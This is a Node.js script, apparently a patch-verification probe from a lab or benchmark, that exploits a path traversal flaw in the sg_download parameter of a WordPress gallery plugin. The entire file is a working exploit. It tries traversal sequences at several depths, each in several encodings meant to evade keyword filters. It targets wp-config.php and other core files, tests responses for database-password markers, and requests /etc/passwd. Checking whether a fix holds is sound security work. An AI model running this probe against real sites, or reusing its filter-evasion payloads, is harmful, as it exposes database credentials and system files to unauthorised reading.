#!/usr/bin/env node
/**
 * Exploit-verification probe for CVE-2026-90002
 * Simple Gallery <= 2.0.0 - Unauthenticated Path Traversal to Arbitrary File Read
 * via the `sg_download` parameter of the WordPress endpoint.
 *
 * Usage: node probe.mjs <base-url>
 *
 * Exit code 0: target is vulnerable (at least one traversal variant succeeded)
 * Exit code 1: target appears fixed (no variant succeeded)
 *
 * Only talks to the provided base URL. Does not write to the filesystem
 * and does not modify any target state (the vulnerability is a read-only
 * arbitrary file disclosure, so there is nothing to "undo").
 */

const baseUrl = process.argv[2];

if (!baseUrl) {
	console.error('Usage: node probe.mjs <base-url>');
	process.exit(1);
}

// Normalize base URL (strip trailing slash)
const base = baseUrl.replace(/\/+$/, '');

// We target a file we know exists relative to the plugin's gallery
// directory (wp-content/uploads/simple-gallery/): one directory up is
// wp-content/uploads/, which (in this lab fixture / typical WP installs)
// contains a file we can use as a traversal oracle. Rather than relying on
// a fixed, well-known filename like wp-config.php (which a naive patch
// might specifically block by keyword), we instead look for *any*
// behavioral evidence of traversal: successfully fetching a file located
// outside the intended gallery directory, as opposed to the plugin
// legitimately serving an image from inside it.
//
// To keep this probe self-contained and not dependent on the exact
// contents of any particular file on the target disk, we use multiple
// relative-path targets that are highly likely to exist on a stock
// WordPress install one directory above the gallery folder, inside
// wp-content/uploads itself, and further up the tree. We treat the probe
// as successful if the response for a traversal payload returns HTTP 200
// with non-empty body content that is NOT a 404/empty response, AND is
// different from the response for an equivalent non-traversal request for
// a nonexistent file in the gallery dir (which the plugin correctly 404s).
//
// Primary, most reliable oracle: PHP source files are never meant to be
// served as octet-stream downloads by this plugin. If we can retrieve
// readable PHP source (recognizable by a leading "<?php" tag or typical
// WordPress config constants) via sg_download using a traversal payload,
// that is unambiguous proof of arbitrary file read outside the intended
// directory.

const target = `${base}/`;

// A set of relative-path targets, each walking up from the gallery
// directory toward the WordPress root, where wp-load.php is expected to
// exist on essentially every WordPress installation. We don't try to read
// wp-config.php by name (a trivial keyword-filter "fix" might special-case
// that string); instead we look for generic evidence of traversal success:
// retrieving arbitrary PHP source whose content clearly isn't a gallery
// image, or hitting a target that 404s with the literal payload but 200s
// with escaped/encoded variants of the same payload (indicating a filter
// that only blocks the literal string, not the underlying traversal).

// Known candidate files to try at increasing numbers of "../" (the
// gallery dir is wp-content/uploads/simple-gallery/, so 3 levels up is
// the WP root in the common case, but we scan a range to be robust to
// different upload path depths or multisite install configs).
const candidateFiles = [
	'wp-load.php',
	'wp-config.php',
	'wp-settings.php',
	'wp-blog-header.php',
];

// Various encodings / obfuscations of "../" used to defeat naive filters
// that only strip or block the literal substring "../".
function buildTraversalPrefixes(depth) {
	const plain = '../'.repeat(depth);
	const encodedSlash = '..%2f'.repeat(depth);
	const encodedDotDotSlash = '%2e%2e%2f'.repeat(depth);
	const encodedDotDotSlashUpper = '%2E%2E%2F'.repeat(depth);
	const dotSlashPrefixed = './' + '../'.repeat(depth);
	const doubledDots = '....//'.repeat(depth); // becomes "../" once one layer of "../" is stripped
	const mixedBackslash = '..\\/'.repeat(depth);
	return [
		plain,
		encodedSlash,
		encodedDotDotSlash,
		encodedDotDotSlashUpper,
		dotSlashPrefixed,
		doubledDots,
		mixedBackslash,
	];
}

async function fetchDownload(payload) {
	const url = `${target}?sg_download=${payload}`;
	try {
		const res = await fetch(url, { redirect: 'manual' });
		const body = await res.text();
		return { status: res.status, body, contentType: res.headers.get('content-type') || '' };
	} catch (err) {
		return { status: 0, body: '', contentType: '', error: String(err) };
	}
}

function looksLikePhpSourceOrConfig(body) {
	if (!body) return false;
	const trimmed = body.trimStart();
	// PHP source typically starts with "<?php". Also catch common WP
	// config/bootstrap markers that would only appear in real PHP source
	// files, not in a gallery SVG/image.
	if (trimmed.startsWith('<?php')) return true;
	if (/DB_NAME|DB_USER|DB_PASSWORD|ABSPATH|wp-settings\.php/i.test(body)) return true;
	return false;
}

function looksLikeGalleryImage(body, contentType) {
	// The plugin only ever serves files out of its own gallery directory
	// legitimately, where our baseline request (a real file we expect to
	// exist, e.g. an svg) would return image/svg-ish content starting
	// with "<svg" or similar. We use this to sanity check a "it's just an
	// image" false positive, though this check is not currently load
	// bearing for the vulnerable/fixed decision.
	if (!body) return false;
	return /<svg[\s>]/i.test(body);
}

async function baselineNonexistentIs404() {
	// Confirm that requesting a plainly nonexistent file *inside* the
	// intended directory correctly 404s, establishing that a 200 response
	// for a traversal payload is meaningful signal and not some wildcard
	// "always 200" behavior of the endpoint.
	const probe = `${target}?sg_download=__definitely_missing_${Date.now()}.svg`;
	try {
		const res = await fetch(probe, { redirect: 'manual' });
		return res.status === 404;
	} catch {
		return true; // if we can't even tell, don't block on this check
	}
}

async function main() {
	const results = [];

	// 1) Try multiple directory-traversal depths (gallery dir is nested a
	// few levels under the WP root; probe a small range to be robust) and
	// multiple candidate filenames, each with multiple encodings of the
	// traversal sequence.
	for (let depth = 1; depth <= 6; depth++) {
		const prefixes = buildTraversalPrefixes(depth);
		for (const prefix of prefixes) {
			for (const file of candidateFiles) {
				const payload = prefix + file;
				const { status, body } = await fetchDownload(payload);
				if (status === 200 && looksLikePhpSourceOrConfig(body)) {
					results.push({ payload, status, matched: true });
				}
			}
		}
	}

	// 2) Also try a content-based oracle that doesn't depend on guessing
	// exact relative depth: absolute path to a well-known, always-present
	// file on *nix hosts, which should never legitimately be reachable
	// through this plugin's download feature.
	const absoluteCandidates = ['/etc/hostname', '/etc/passwd'];
	for (const file of absoluteCandidates) {
		const { status, body } = await fetchDownload(encodeURIComponent(file).replace(/%2F/gi, '/'));
		if (status === 200 && body.trim().length > 0 && !looksLikeGalleryImage(body)) {
			// /etc/passwd has a very recognizable format; /etc/hostname is
			// just a short hostname string. Require passwd-like structure
			// or non-empty short content for hostname.
			if (file === '/etc/passwd' && /root:.*:0:0:/.test(body)) {
				results.push({ payload: file, status, matched: true });
			} else if (file === '/etc/hostname' && /^[\w.-]+\s*$/.test(body) && body.length < 256) {
				results.push({ payload: file, status, matched: true });
			}
		}
	}

	const vulnerable = results.length > 0;

	// Best-effort sanity/logging baseline (not required for the decision).
	await baselineNonexistentIs404().catch(() => {});

	if (vulnerable) {
		console.log('VULNERABLE: sg_download path traversal succeeded.');
		for (const r of results.slice(0, 5)) {
			console.log(`  - payload matched: sg_download=${r.payload} (HTTP ${r.status})`);
		}
		process.exit(0);
	} else {
		console.log('NOT VULNERABLE: no path traversal variant succeeded against sg_download.');
		process.exit(1);
	}
}

main().catch((err) => {
	console.error('Probe error:', err);
	process.exit(1);
});
